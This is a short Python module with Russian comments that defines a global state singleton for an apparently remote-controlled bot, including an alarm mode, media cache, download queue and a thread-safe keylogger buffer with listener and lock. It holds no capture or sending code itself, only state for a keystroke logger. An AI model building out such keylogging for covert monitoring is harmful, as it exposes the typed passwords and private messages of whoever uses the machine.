from collections import deque
import threading

class BotState:
    """Хранилище глобального состояния системы."""
    def __init__(self):
        self.security_mode = False
        self.last_alarm_time = 0.0
        self.alarm_cooldown = 5.0
        self.bot_loop = None
        self.bot_client = None
        
        self.media_cache = {}
        self.pending_downloads = {}

        # Кейлоггер (потокобезопасный)
        self.keylog_active = False
        # deque с ограничением на 10000 символов (защита от утечки памяти)
        self.keylog_buffer = deque(maxlen=10000)
        self.keylog_listener = None
        # Блокировка для потокобезопасного доступа к keylog_buffer
        self.keylog_lock = threading.Lock()

# Глобальный экземпляр состояния (Singleton)
state = BotState()